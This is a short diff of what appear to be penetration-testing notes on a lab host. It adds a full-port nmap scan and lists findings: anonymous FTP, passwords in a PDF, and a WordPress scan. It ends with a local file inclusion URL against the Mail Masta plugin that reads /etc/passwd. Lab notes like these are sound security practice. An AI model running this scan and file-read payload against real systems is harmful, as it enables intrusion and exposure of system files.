@@ -1,6 +1,8 @@
+nmap -p- -sV -sC -Pn 192.168.102.112 --open
 
 ftp anonymous available
 passwords in pdf
+
 wpscan for 
 LFI in mail masta plugin
 http://192.168.102.112/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
